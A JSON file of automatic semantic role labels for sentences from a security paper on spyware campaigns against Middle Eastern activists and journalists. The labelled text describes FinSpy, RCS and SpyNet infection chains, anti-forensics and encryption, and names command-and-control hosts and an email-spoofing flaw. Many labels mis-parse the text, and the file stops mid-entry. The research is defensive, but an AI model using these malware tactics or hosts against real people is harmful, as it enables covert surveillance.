ReadNotify.com forbids spoofing in their TOS"}}, "records": {"ARG0": {"text": "ReadNotify.com"}, "R-ARG0": {"text": "which"}, "V": {"text": "records", "index": 11}, "ARG1": {"text": "the user \u2019s IP address upon"}, "ARGM-TMP": {"text": "While ReadNotify.com forbids spoofing in their TOS"}}, "forbids": {"V": {"text": "forbids", "index": 20}, "ARG1": {"text": "spoofing in their TOS"}}, "spoofing": {"V": {"text": "spoofing", "index": 21}, "ARGM-MNR": {"text": "in their TOS"}}, "has": {"ARG0": {"text": "the service"}, "V": {"text": "has", "index": 28}, "ARG1": {"text": "a vulnerability known to the attackers ("}}, "known": {"ARG1": {"text": "a vulnerability"}, "V": {"text": "known", "index": 31}, "ARG0": {"text": "to the attackers ("}}, "confirmed": {"ARG0": {"text": "we"}, "V": {"text": "confirmed", "index": 39}, "ARG1": {"text": ") that allows spoofing the From address by directly setting the parameters on a submission form on their website"}}, "allows": {"ARG0": {"text": "a"}, "R-ARG0": {"text": "that"}, "V": {"text": "allows", "index": 42}, "ARG1": {"text": "spoofing the From address by directly setting the parameters on a submission form on their website"}}, "spoofing_2": {"V": {"text": "spoofing", "index": 43}, "ARG1": {"text": "the"}, "ARG2": {"text": "From address"}, "ARGM-MNR": {"text": "by directly setting the parameters on a submission form on their website"}}, "setting": {"ARGM-MNR": {"text": "directly"}, "V": {"text": "setting", "index": 49}, "ARG1": {"text": "the parameters"}, "ARG2": {"text": "on a submission form on their website"}}}, " (Interestingly, spyware subse-\nquently sent to others has used bait content about Ahmed.)\n\n   Further attacks: In October 2012, UAE Journalist A and\nHuman Rights activist B (per Figure 6) forwarded us suspi-\ncious e-mails they had received that contained a Word docu-\nment corresponding to the first stage of 3-Stage Exploit Kit\n(Figure 5)": {"sent": {"ARG1": {"text": "spyware subse- quently"}, "V": {"text": "sent", "index": 6}, "ARG2": {"text": "to others"}}, "has": {"V": {"text": "has", "index": 9}}, "used": {"ARGM-ADV": {"text": "( Interestingly"}, "ARG0": {"text": "spyware subse- quently sent to others"}, "V": {"text": "used", "index": 10}, "ARG1": {"text": "bait content"}, "ARG2": {"text": "about Ahmed/ ) Further attacks"}}, "forwarded": {"ARGM-TMP": {"text": "In October 2012"}, "ARG0": {"text": "UAE Journalist A and Human Rights activist B ( per Figure 6 )"}, "V": {"text": "forwarded", "index": 37}, "ARG1": {"text": "us suspi- cious e - mails they had received that contained a Word docu- ment corresponding to the first stage of 3-Stage Exploit Kit ( Figure 5 )"}}, "suspi-": {"ARG0": {"text": "us"}, "V": {"text": "suspi-", "index": 39}, "ARG1": {"text": "cious e - mails they had received that contained a Word docu- ment corresponding to the first stage of 3-Stage Exploit Kit ( Figure 5 )"}}, "had": {"V": {"text": "had", "index": 45}}, "received": {"ARG1": {"text": "cious e - mails"}, "ARG0": {"text": "they"}, "V": {"text": "received", "index": 46}}, "contained": {"ARG0": {"text": "cious e - mails"}, "R-ARG0": {"text": "that"}, "V": {"text": "contained", "index": 48}, "ARG1": {"text": "a Word docu- ment corresponding to the first stage of 3-Stage Exploit Kit ( Figure 5 )"}}, "corresponding": {"ARG1": {"text": "a Word docu-"}, "ARG0": {"text": "ment"}, "V": {"text": "corresponding", "index": 53}, "ARG2": {"text": "to the first stage of 3-Stage Exploit Kit ( Figure 5 )"}}}, " The attacks we have\ndocumented usually involve the use of malicious links or e-mail\nattachments, designed to obtain information from a device": {"have": {"V": {"text": "have", "index": 3}}, "documented": {"ARG1": {"text": "The attacks"}, "ARG0": {"text": "we"}, "V": {"text": "documented", "index": 4}}, "involve": {"ARG2": {"text": "The attacks we have documented"}, "ARGM-ADV": {"text": "usually"}, "V": {"text": "involve", "index": 6}, "ARG1": {"text": "the use of malicious links or e - mail attachments , designed to obtain information from a device"}}, "designed": {"ARG1": {"text": "malicious links or e - mail attachments"}, "V": {"text": "designed", "index": 18}, "ARG3": {"text": "to obtain information from a device"}}, "obtain": {"V": {"text": "obtain", "index": 20}, "ARG1": {"text": "information"}, "ARG2": {"text": "from a device"}}}, "\n</footnote>\n   sophisticated than FinSpy and RCS, they share the same ba-\nsic functionality, including screen capture, keylogging, remote\nmonitoring of webcams and microphones, remote shell, and file\nexfiltration": {"share": {"R-ARG0": {"text": "sophisticated than FinSpy and RCS"}, "ARG0": {"text": "they"}, "V": {"text": "share", "index": 7}, "ARG1": {"text": "the same ba- sic functionality , including screen capture , keylogging , remote monitoring of webcams and microphones , remote shell , and file exfiltration"}}, "including": {"ARG2": {"text": "the same ba- sic functionality"}, "V": {"text": "including", "index": 14}, "ARG1": {"text": "screen capture , keylogging , remote monitoring of webcams and microphones , remote shell , and file exfiltration"}}}, " When run, the\nsample unpacks a compiled Visual Basic project that loads, via\nthe RunPE method <fn>[62]</fn> , an executable packed with UPX <fn>[63]</fn> ": {"unpacks": {"ARGM-TMP": {"text": "When run"}, "ARG0": {"text": "the sample"}, "V": {"text": "unpacks", "index": 5}, "ARG1": {"text": "a compiled Visual Basic project that loads"}, "ARGM-MNR": {"text": "via the RunPE method"}}, "loads": {"ARG1": {"text": "a compiled Visual Basic project"}, "R-ARG1": {"text": "that"}, "V": {"text": "loads", "index": 12}}}, " This address was un-\nreachable when we probed it; a researcher pointed us to an FS-\nBSpy sample that contained an Arabic-language bait document\nabout Omani poetry, which talked to a C&C in the UK": {"was": {"ARG1": {"text": "This address"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "un- reachable"}, "ARGM-TMP": {"text": "when we probed it"}}, "probed": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "we"}, "V": {"text": "probed", "index": 7}, "ARG1": {"text": "it"}}, "pointed": {"ARG0": {"text": "a researcher"}, "V": {"text": "pointed", "index": 12}, "ARG1": {"text": "us"}, "ARG2": {"text": "to an FS- BSpy sample that contained an Arabic - language bait document about Omani poetry , which talked to a C&C in the UK"}}, "contained": {"ARG0": {"text": "an FS- BSpy sample"}, "R-ARG0": {"text": "that"}, "V": {"text": "contained", "index": 20}, "ARG1": {"text": "an Arabic - language bait document about Omani poetry , which talked to a C&C in the UK"}}, "talked": {"ARG0": {"text": "Omani poetry"}, "R-ARG0": {"text": "which"}, "V": {"text": "talked", "index": 32}, "ARG2": {"text": "to a C&C in the UK"}}}, "\n\nThe RCS samples we examined also had the ability to propa-\n\ngate to other devices, including into inactive VMWare virtual\nmachines by modifying the disk image, onto USB flash drives,\n\nand onto Windows Mobile phones": {"examined": {"ARG1": {"text": "The RCS samples"}, "ARG0": {"text": "we"}, "V": {"text": "examined", "index": 4}}, "had": {"ARG0": {"text": "The RCS samples we examined"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "had", "index": 6}, "ARG1": {"text": "the ability to propa- gate to other devices , including into inactive VMWare virtual machines by modifying the disk image , onto USB flash drives , and onto Windows Mobile phones"}}, "propa-": {"V": {"text": "propa-", "index": 10}, "ARG1": {"text": "gate/ to other devices"}}, "including": {"ARG2": {"text": "the ability to propa- gate to other devices"}, "V": {"text": "including", "index": 16}, "ARG1": {"text": "into inactive VMWare virtual machines"}, "ARGM-MNR": {"text": "by modifying the disk image , onto USB flash drives , and onto Windows Mobile phones"}}, "modifying": {"V": {"text": "modifying", "index": 23}, "ARG1": {"text": "the disk image , onto USB flash drives , and onto Windows Mobile phones"}}}, " The executables used virtualized obfusca-\ntion <fn>[28]</fn> , which appeared to be custom-designed": {"used": {"ARG0": {"text": "The executables"}, "V": {"text": "used", "index": 2}, "ARG1": {"text": "virtualized obfusca- tion"}}, "appeared": {"ARG1": {"text": "obfusca- tion"}, "C-ARG1": {"text": "which/ to be custom -"}, "V": {"text": "appeared", "index": 8}}, "be": {"ARG1": {"text": "which"}, "V": {"text": "be", "index": 10}, "ARG2": {"text": "custom"}}, "designed": {"ARG1": {"text": "which"}, "ARGM-EXT": {"text": "custom"}, "V": {"text": "designed", "index": 13}}}, "\n   To exfiltrate data back to the C&C server, a module encrypts\nand writes it to disk in a special folder": {"exfiltrate": {"V": {"text": "exfiltrate", "index": 1}, "ARG1": {"text": "data"}, "ARG2": {"text": "back to the C&C server ,"}, "ARG0": {"text": "a module encrypts"}}, "writes": {"V": {"text": "writes", "index": 13}, "ARG1": {"text": "it to disk in a special folder"}}, "disk": {"ARG0": {"text": "it"}, "V": {"text": "disk", "index": 16}, "ARGM-LOC": {"text": "in a special folder"}}}, " (RCS\ntraffic is identifiable based on a distinctive user agent and URL\nin POST requests.) A sample of FSBSpy apparently installed\nfrom an exploit on a Turkish server talked to one of the servers\nin this group.<fn>[79]</fn>\n   We also found server groups containing servers in Uzbek-\nistan and Kazakhstan; we found FSBSpy samples on Virus-\nTotal uploaded from these countries that communicated with\nservers in these groups": {"is": {"V": {"text": "is", "index": 3}}, "based": {"ARG1": {"text": "( RCS traffic"}, "ARGM-MNR": {"text": "identifiable"}, "V": {"text": "based", "index": 5}, "ARG2": {"text": "on a distinctive user agent and URL in POST requests"}}, "installed": {"ARG1": {"text": "A sample of FSBSpy"}, "ARGM-ADV": {"text": "apparently"}, "V": {"text": "installed", "index": 23}, "ARG2": {"text": "from an exploit on a Turkish server talked/ to one of the servers in this group"}}, "talked": {"ARGM-ADV": {"text": "apparently"}, "V": {"text": "talked", "index": 31}}, "found": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "found", "index": 43}, "ARG1": {"text": "server groups containing servers in Uzbek- istan and Kazakhstan"}}, "containing": {"ARG0": {"text": "server groups"}, "V": {"text": "containing", "index": 46}, "ARG1": {"text": "servers"}, "ARGM-LOC": {"text": "in Uzbek- istan and Kazakhstan"}}, "found_2": {"ARG0": {"text": "we"}, "V": {"text": "found", "index": 55}, "ARG1": {"text": "FSBSpy samples on Virus- Total uploaded from these countries that communicated with servers in these groups"}}, "uploaded": {"ARG1": {"text": "FSBSpy samples on Virus- Total"}, "V": {"text": "uploaded", "index": 61}, "ARG0": {"text": "from these countries that communicated with servers in these groups"}}, "communicated": {"ARG0": {"text": "these countries"}, "R-ARG0": {"text": "that"}, "V": {"text": "communicated", "index": 66}, "ARG2": {"text": "with servers in these groups"}}}, " Finally, FinSpy\u2019s wire protocol for C&C commu-\nnication uses the same type of encryption, and thus is subject\nto the same brute force attack on AES keys": {"uses": {"ARGM-TMP": {"text": "Finally"}, "ARG0": {"text": "FinSpy \u2019s wire protocol for C&C commu- nication"}, "V": {"text": "uses", "index": 10}, "ARG1": {"text": "the same type of encryption"}}, "is": {"ARGM-TMP": {"text": "Finally"}, "ARG1": {"text": "FinSpy \u2019s wire protocol for C&C commu- nication"}, "ARGM-ADV": {"text": "thus"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "subject to the same brute force attack on AES keys"}}}, " However, the account also directly crit-\nicized the King on occasion, in one case referring to him as\n\u201cweak\u201d and \u201cstingy.\u201d An account linked to al9mood sent Je-\nhad Abdulla an IP spy link on 10/2/12 in a public message": {"icized": {"ARGM-DIS": {"text": "However"}, "ARG0": {"text": "the account/ crit-"}, "ARGM-ADV": {"text": "also"}, "ARGM-MNR": {"text": "directly"}, "V": {"text": "icized", "index": 7}, "ARG1": {"text": "the King"}, "ARGM-TMP": {"text": "on occasion"}}, "referring": {"V": {"text": "referring", "index": 16}, "ARG1": {"text": "to him"}, "ARG3": {"text": "as \u201c weak \u201d and \u201c stingy"}}, "linked": {"ARG1": {"text": "An account"}, "V": {"text": "linked", "index": 30}, "C-ARG1": {"text": "to al9mood sent Je-"}}, "sent": {"ARG1": {"text": "An account linked to al9mood"}, "V": {"text": "sent", "index": 33}}, "had": {"V": {"text": "had", "index": 35}}}, "\nAs summarized in Table 3, the attacks often include fake or ma-\nliciously packaged security tools; intriguing, or ideological, or\nmovement-relevant content (e.g": {"summarized": {"V": {"text": "summarized", "index": 1}, "ARG2": {"text": "in Table"}, "ARGM-EXT": {"text": "3"}}, "include": {"ARGM-ADV": {"text": "As summarized in Table 3"}, "ARG2": {"text": "the attacks"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "include", "index": 9}, "ARG1": {"text": "fake or ma- liciously packaged security tools ; intriguing , or ideological , or movement - relevant content ( e.g"}}, "packaged": {"V": {"text": "packaged", "index": 14}, "ARG1": {"text": "security tools"}}}, "\n    In the most common attack sequence we observed, illus-\ntrated with three examples in Figure 3, the attacker seeds mal-\nware via private chat messages, posts in opposition-controlled\nsocial media groups, or e-mail": {"observed": {"ARGM-LOC": {"text": "In"}, "ARG1": {"text": "the most common attack sequence"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 7}, "C-ARG1": {"text": "illus- trated with three examples in Figure 3/ the attacker seeds/ private chat messages , posts in opposition - controlled social media groups , or e - mail"}}, "trated": {"ARGM-LOC": {"text": "In the most common attack sequence"}, "ARG0": {"text": "illus-"}, "V": {"text": "trated", "index": 10}, "ARG1": {"text": "with three examples/ in Figure 3"}}, "mal-": {"ARG0": {"text": "the attacker seeds"}, "V": {"text": "mal-", "index": 21}, "ARG1": {"text": "ware"}, "ARGM-MNR": {"text": "via private chat messages , posts in opposition - controlled social media groups"}}, "ware": {"ARG1": {"text": "the attacker seeds mal-"}, "V": {"text": "ware", "index": 22}, "ARGM-MNR": {"text": "via private chat messages"}}, "controlled": {"ARG0": {"text": "opposition"}, "V": {"text": "controlled", "index": 32}, "ARG1": {"text": "social media groups"}}}, " We grouped servers by the SSL certificates they\nreturned, and found that each group forwarded to only a sin-\ngle server, except for one case where a group forwarded to two\ndifferent IPs (both in Morocco)": {"grouped": {"ARG0": {"text": "We"}, "V": {"text": "grouped", "index": 1}, "ARG1": {"text": "servers"}, "ARGM-MNR": {"text": "by the SSL certificates they returned"}}, "returned": {"ARG4": {"text": "the"}, "ARG1": {"text": "they"}, "V": {"text": "returned", "index": 8}}, "found": {"ARG0": {"text": "We"}, "V": {"text": "found", "index": 11}, "ARG1": {"text": "that each group forwarded to only a sin- gle server , except for one case where a group forwarded to two different IPs ( both in Morocco )"}}, "forwarded": {"ARG0": {"text": "each group"}, "V": {"text": "forwarded", "index": 15}, "ARG1": {"text": "to only a sin- gle server , except for one case where a group forwarded to two different IPs ( both in Morocco )"}}, "forwarded_2": {"ARGM-LOC": {"text": "one case"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "a group"}, "V": {"text": "forwarded", "index": 30}, "ARG1": {"text": "to two different IPs ( both in Morocco )"}}}, " The\nthird attack in Figure 3, observed in October 2013, entices tar-\ngets with e-mails purporting to contain or link to videos about\nthe current conflict, infecting victims with Xtreme RAT, and\nusing the C&C tn1.linkpc.net": {"observed": {"ARG1": {"text": "The"}, "V": {"text": "observed", "index": 7}, "ARGM-LOC": {"text": "in October 2013"}}, "entices": {"V": {"text": "entices", "index": 12}, "ARG1": {"text": "tar-"}}, "gets": {"ARG1": {"text": "The third attack in Figure 3 , observed in October 2013 , entices tar-"}, "V": {"text": "gets", "index": 14}, "ARG2": {"text": "with e - mails purporting"}, "ARGM-PRP": {"text": "to contain or link to videos about the current conflict , infecting victims with Xtreme RAT , and using the C&C tn1.linkpc.net"}}, "purporting": {"ARG0": {"text": "e - mails"}, "V": {"text": "purporting", "index": 19}, "ARG1": {"text": "to contain or link to videos about the current conflict"}}, "contain": {"V": {"text": "contain", "index": 21}, "ARG1": {"text": "to videos about the current conflict , infecting victims with Xtreme RAT , and using the C&C"}}, "link": {"V": {"text": "link", "index": 23}, "ARG1": {"text": "to videos about the current conflict"}}, "infecting": {"ARG0": {"text": "The third attack in Figure 3/ entices"}, "V": {"text": "infecting", "index": 31}, "ARG1": {"text": "victims"}, "ARG2": {"text": "with Xtreme RAT"}}, "using": {"V": {"text": "using", "index": 38}, "ARG1": {"text": "the C&C tn1.linkpc.net"}}}, " The 32 byte AES key and 16 byte\nIV are generated by repeatedly reading the low-order-4-bytes of\nthe Windows clock": {"are": {"V": {"text": "are", "index": 9}}, "generated": {"ARG1": {"text": "The 32 byte AES key and 16 byte IV"}, "V": {"text": "generated", "index": 10}, "ARGM-MNR": {"text": "by repeatedly reading the low - order-4-bytes of the Windows clock"}}, "reading": {"ARG0": {"text": "AES key and 16 byte IV"}, "ARGM-TMP": {"text": "repeatedly"}, "V": {"text": "reading", "index": 13}, "ARG1": {"text": "the low - order-4-bytes of the Windows clock"}}}, " Member C received a malicious\nfile as an e-mail attachment, while NGO Worker D was sent a\nshortened link (url[.] no/Uu5) to a download from a directory\nof Mrconstrucciones[.] net,<fn>7</fn>  a site that may have been com-\npromised": {"received": {"ARG0": {"text": "Member C"}, "V": {"text": "received", "index": 2}, "ARG1": {"text": "a malicious file"}, "ARG3": {"text": "as an e - mail attachment"}, "ARGM-ADV": {"text": "while NGO Worker D was sent a shortened link ( url[. ] no / Uu5 ) to a download from a directory of Mrconstrucciones[. ] net , a site that may have been com- promised"}}, "was": {"V": {"text": "was", "index": 17}}, "sent": {"V": {"text": "sent", "index": 18}, "ARG1": {"text": "a shortened link ( url[. ] no / Uu5 )"}, "ARG2": {"text": "to a download from a directory of Mrconstrucciones[. ] net , a site that may have been com- promised"}}, "shortened": {"V": {"text": "shortened", "index": 20}, "ARG1": {"text": "link ("}}, "may": {"V": {"text": "may", "index": 43}}, "have": {"V": {"text": "have", "index": 44}}, "been": {"R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "been", "index": 45}, "ARG2": {"text": "com- promised"}}, "promised": {"ARG2": {"text": "a site"}, "R-ARG2": {"text": "that"}, "ARGM-MOD": {"text": "may"}, "ARGM-MNR": {"text": "com-"}, "V": {"text": "promised", "index": 47}}}, " Some samples were packed\n with the MPress packer <fn>[55]</fn> , and some Windows samples were\n obfuscated to look like the PuTTY SSH client": {"were": {"V": {"text": "were", "index": 2}}, "packed": {"ARG1": {"text": "Some samples"}, "V": {"text": "packed", "index": 3}, "ARG2": {"text": "with the MPress packer"}}, "were_2": {"ARG1": {"text": "some Windows samples"}, "V": {"text": "were", "index": 13}, "ARG2": {"text": "obfuscated to look like the PuTTY SSH client"}}, "obfuscated": {"ARG1": {"text": "some Windows samples"}, "V": {"text": "obfuscated", "index": 14}, "ARGM-PRP": {"text": "to look like the PuTTY SSH client"}}, "look": {"V": {"text": "look", "index": 16}, "ARG1": {"text": "like the PuTTY SSH client"}}}, " We also similarly obtained and analyzed sam-\nples of FSBSpy <fn>[72]</fn> , a piece of malware that can report system\ninformation, upload screenshots, and drop and execute more\nmalware": {"obtained": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also/ similarly"}, "V": {"text": "obtained", "index": 3}, "ARG1": {"text": "sam- ples of FSBSpy , a piece of malware that can report system information , upload screenshots , and drop and execute more malware"}}, "analyzed": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also/ similarly"}, "V": {"text": "analyzed", "index": 5}, "ARG1": {"text": "sam- ples of FSBSpy , a piece of malware that can report system information , upload screenshots , and drop and execute more malware"}}, "can": {"ARG0": {"text": "malware"}, "R-ARG0": {"text": "that"}, "V": {"text": "can", "index": 16}, "ARG1": {"text": "report system information , upload screenshots ,"}}, "report": {"ARG0": {"text": "a piece of malware"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "report", "index": 17}, "ARG1": {"text": "system information"}}, "upload": {"V": {"text": "upload", "index": 21}, "ARG1": {"text": "screenshots"}}, "drop": {"ARG0": {"text": "a piece of/ malware"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "drop", "index": 25}, "ARG1": {"text": "more malware"}}, "execute": {"ARG0": {"text": "a piece of malware"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "execute", "index": 27}, "ARG1": {"text": "more malware"}}}, " For example, the RCS\n sample sent to Ahmed adds a Run registry key, whereas the\n FinSpy samples used in Bahrain overwrite the hard disk\u2019s boot\n sector to modify the boot process; the spyware is loaded be-\n\n<footer>518\u2003 23rd USENIX Security Symposium\n</footer>\n\ffore the OS, and injects itself into OS processes as they start": {"sent": {"ARG1": {"text": "the RCS sample"}, "V": {"text": "sent", "index": 6}, "ARG2": {"text": "to Ahmed"}}, "adds": {"ARGM-DIS": {"text": "For example"}, "ARG0": {"text": "the RCS sample sent to Ahmed"}, "V": {"text": "adds", "index": 9}, "ARG1": {"text": "a Run registry key"}, "ARGM-ADV": {"text": "whereas the FinSpy samples used in Bahrain overwrite the hard disk \u2019s boot sector to modify the boot process ; the spyware is loaded be- fore the OS , and injects itself into OS processes as they start"}}, "used": {"ARG1": {"text": "the FinSpy samples"}, "V": {"text": "used", "index": 19}, "ARGM-LOC": {"text": "in Bahrain overwrite"}, "ARG2": {"text": "the hard disk/ to modify the boot process"}}, "modify": {"ARG0": {"text": "the FinSpy samples used in Bahrain overwrite the hard disk \u2019s boot sector"}, "V": {"text": "modify", "index": 30}, "ARG1": {"text": "the boot process"}}, "is": {"V": {"text": "is", "index": 37}}, "loaded": {"ARG2": {"text": "the spyware"}, "V": {"text": "loaded", "index": 38}}, "injects": {"ARG0": {"text": "the spyware"}, "V": {"text": "injects", "index": 45}, "ARG1": {"text": "itself"}, "ARG2": {"text": "into OS processes"}, "ARGM-TMP": {"text": "as they start"}}, "start": {"ARG0": {"text": "they"}, "V": {"text": "start", "index": 52}}}, " It then over-\nwrites the files, renames them several times, and deletes them,\n\nin an apparent effort to frustrate forensic analysis": {"over-": {}, "writes": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "writes", "index": 3}, "ARG1": {"text": "the files"}, "C-ARG0": {"text": "renames them several times/ and deletes them"}, "ARGM-PRP": {"text": "in an apparent effort to frustrate forensic analysis"}}, "renames": {"V": {"text": "renames", "index": 7}, "ARG1": {"text": "them"}, "ARGM-TMP": {"text": "several times"}, "ARGM-PRP": {"text": "in an apparent effort"}}, "deletes": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "deletes", "index": 13}, "ARG1": {"text": "them"}, "ARGM-PRP": {"text": "in an apparent effort to frustrate forensic analysis"}}, "frustrate": {"V": {"text": "frustrate", "index": 21}, "ARG1": {"text": "forensic analysis"}}}, "\n\n   Analysis of capabilities: We found that the spyware has\na modular design, and can download additional modules from\na command & control (C&C) server, including password cap-\nture (from over 20 applications) and recording of screenshots,\nSkype chat, file transfers, and input from the computer\u2019s micro-\nphone and webcam": {"found": {"ARG0": {"text": "We"}, "V": {"text": "found", "index": 5}, "ARG1": {"text": "that the spyware has a modular design , and can download additional modules from a command & control ( C&C ) server , including password cap- ture ( from over 20 applications ) and recording of screenshots , Skype chat , file transfers , and input from the computer \u2019s micro- phone and webcam"}}, "has": {"ARG0": {"text": "the spyware"}, "V": {"text": "has", "index": 9}, "ARG1": {"text": "a modular design"}}, "can": {"V": {"text": "can", "index": 15}}, "download": {"ARG0": {"text": "We/ the spyware"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "download", "index": 16}, "ARG1": {"text": "additional modules"}, "ARG2": {"text": "from a command & control ( C&C ) server"}, "C-ARG1": {"text": "including password cap- ture ( from over 20 applications ) and recording of screenshots/ file transfers/ and input from the computer \u2019s micro- phone and webcam"}}, "including": {"ARG2": {"text": "( C&C )"}, "V": {"text": "including", "index": 29}, "ARG1": {"text": "password cap- ture ( from over 20 applications ) and recording of screenshots , Skype"}}}, "\n\n   C&C server:            The samples communicated with\n77.69.140.194, which belongs to a subscriber of\nBatelco, Bahrain\u2019s main ISP": {"communicated": {"ARG1": {"text": "The samples"}, "V": {"text": "communicated", "index": 5}, "ARG2": {"text": "with 77.69.140.194 , which belongs to a subscriber of Batelco , Bahrain \u2019s main ISP"}}, "belongs": {"ARG0": {"text": "77.69.140.194"}, "R-ARG0": {"text": "which"}, "V": {"text": "belongs", "index": 10}, "ARG1": {"text": "to a subscriber of Batelco , Bahrain \u2019s main ISP"}}}, " The exploit\ndownloaded a second stage, which in turn downloaded a sam-\nple of SpyNet from maile-s.com": {"downloaded": {"ARG0": {"text": "The exploit"}, "V": {"text": "downloaded", "index": 2}, "ARG1": {"text": "a second stage , which in turn downloaded a sam- ple of SpyNet from maile-s.com"}}, "downloaded_2": {"ARG0": {"text": "a second stage"}, "R-ARG0": {"text": "which"}, "ARGM-DIS": {"text": "in turn"}, "V": {"text": "downloaded", "index": 10}, "ARG1": {"text": "a sam- ple of SpyNet"}, "ARG2": {"text": "from maile-s.com"}}}, " The RCS\nsamples also communicated with domains with lapsed registra-\n\ntions, so we registered them to observe incoming traffic": {"communicated": {"ARG1": {"text": "The RCS samples"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "communicated", "index": 4}, "ARG2": {"text": "with domains with lapsed registra- tions"}, "ARGM-PRP": {"text": "so we registered them to observe incoming traffic"}}, "lapsed": {"V": {"text": "lapsed", "index": 8}, "ARG1": {"text": "registra-"}}, "registered": {"ARG0": {"text": "we"}, "V": {"text": "registered", "index": 14}, "ARG1": {"text": "them"}, "ARG2": {"text": "to observe incoming traffic"}}, "observe": {"ARG0": {"text": "them"}, "V": {"text": "observe", "index": 17}, "ARG1": {"text": "incoming traffic"}}}, " The key and IV are encrypted using an em-\nbedded RSA-2048 public key, and stored in the same file as the\ndata": {"are": {"V": {"text": "are", "index": 4}}, "encrypted": {"ARG1": {"text": "The key and IV"}, "V": {"text": "encrypted", "index": 5}, "ARGM-PRD": {"text": "using an em- bedded RSA-2048 public key"}}, "using": {"ARG0": {"text": "The key and IV"}, "V": {"text": "using", "index": 6}, "ARG1": {"text": "an em- bedded RSA-2048 public key"}}, "bedded": {"ARG0": {"text": "The key and IV"}, "V": {"text": "bedded", "index": 9}, "ARG1": {"text": "RSA-2048 public key"}}, "stored": {"ARG0": {"text": "The key and IV"}, "V": {"text": "stored", "index": 15}, "ARGM-PRD": {"text": "in the same file/ as the data"}}}, "\n\n\n   Analysis of encryption: Because the malware employed\nmyriad known anti-debugging and anti-analysis techniques, it\nthwarted our attempts to attach debuggers": {"employed": {"ARG0": {"text": "the malware"}, "V": {"text": "employed", "index": 7}, "ARG1": {"text": "myriad known anti - debugging and anti - analysis techniques"}}, "known": {"ARG0": {"text": "the malware employed myriad"}, "V": {"text": "known", "index": 9}, "ARG1": {"text": "anti - debugging and anti - analysis techniques"}}, "thwarted": {"ARGM-CAU": {"text": "Because the malware employed myriad known anti - debugging and anti - analysis techniques"}, "ARG0": {"text": "it"}, "V": {"text": "thwarted", "index": 20}, "ARG1": {"text": "our attempts to attach debuggers"}}, "attach": {"ARG0": {"text": "it"}, "V": {"text": "attach", "index": 24}, "ARG1": {"text": "debuggers"}}}, " The messages\nusually include text, often in Arabic, that attempts to persuade\nthe target to execute the file or click the link": {"include": {"ARG2": {"text": "The messages"}, "ARGM-TMP": {"text": "usually/ often in Arabic"}, "V": {"text": "include", "index": 3}, "ARG1": {"text": "text ,/ , that attempts to persuade the target to execute the file or click the link"}}, "attempts": {"ARG0": {"text": "text"}, "R-ARG0": {"text": "that"}, "V": {"text": "attempts", "index": 11}, "ARG1": {"text": "to persuade the target to execute the file or click the link"}}, "persuade": {"V": {"text": "persuade", "index": 13}, "ARG1": {"text": "the target"}, "ARG2": {"text": "to execute the file or click the link"}}, "execute": {"ARG0": {"text": "the target"}, "V": {"text": "execute", "index": 17}, "ARG1": {"text": "the file"}}, "click": {"ARG0": {"text": "the target"}, "V": {"text": "click", "index": 21}, "ARG1": {"text": "the link"}}}, " An\nunidentified dropper using this C&C targeted Journalist F; a\nSpyNet attack on Relative of political detainee D also used\nthis C&C": {"using": {"ARG0": {"text": "An unidentified dropper"}, "V": {"text": "using", "index": 3}, "ARG1": {"text": "this C&C targeted Journalist F"}}, "targeted": {"V": {"text": "targeted", "index": 6}, "ARG1": {"text": "Journalist F"}}, "used": {"ARG0": {"text": "a SpyNet attack on Relative of political detainee D"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "used", "index": 20}, "ARG1": {"text": "this C&C"}}}, " The exploits primarily downloaded instances of SpyNet\nfrom upload.bz, which for the most part communicated\nwith C&C at sn.all-google.com": {"downloaded": {"ARG0": {"text": "The exploits"}, "ARGM-ADV": {"text": "primarily"}, "V": {"text": "downloaded", "index": 3}, "ARG1": {"text": "instances of SpyNet"}, "ARG2": {"text": "from upload.bz , which for the most part communicated with C&C at sn.all-google.com"}}, "communicated": {"ARG1": {"text": "SpyNet from upload.bz"}, "R-ARG1": {"text": "which"}, "ARGM-ADV": {"text": "for the most part"}, "V": {"text": "communicated", "index": 15}, "ARG2": {"text": "with C&C"}, "ARGM-LOC": {"text": "at sn.all-google.com"}}}, " The attachment contained an embedded Flash file\nthat exploited a vulnerability fixed in Adobe Flash 11.4, loading\nshell code to download a second stage from faddeha.com": {"contained": {"ARG0": {"text": "The attachment"}, "V": {"text": "contained", "index": 2}, "ARG1": {"text": "an embedded Flash file that exploited a vulnerability fixed in Adobe Flash 11.4 , loading shell code to download a second stage from faddeha.com"}}, "embedded": {"V": {"text": "embedded", "index": 4}, "ARG1": {"text": "Flash file"}}, "exploited": {"ARG0": {"text": "an embedded Flash file"}, "R-ARG0": {"text": "that"}, "V": {"text": "exploited", "index": 8}, "ARG1": {"text": "a vulnerability fixed"}, "ARG2": {"text": "in Adobe Flash 11.4"}}, "fixed": {"ARG1": {"text": "a vulnerability"}, "V": {"text": "fixed", "index": 11}, "ARGM-LOC": {"text": "in Adobe Flash 11.4"}}, "loading": {"R-ARG0": {"text": "that"}, "V": {"text": "loading", "index": 17}, "ARG1": {"text": "shell code"}, "ARGM-PRP": {"text": "to download a second stage from faddeha.com"}}, "download": {"V": {"text": "download", "index": 21}, "ARG1": {"text": "a second stage"}, "ARG2": {"text": "from faddeha.com"}}}, " The at-\ntacker sends the pseudonymous account a link to a webpage or\nan e-mail containing an embedded remote image, using one of\nmany freely-available services.<fn>2</fn>  When the victim clicks on the\nlink or opens the e-mail, 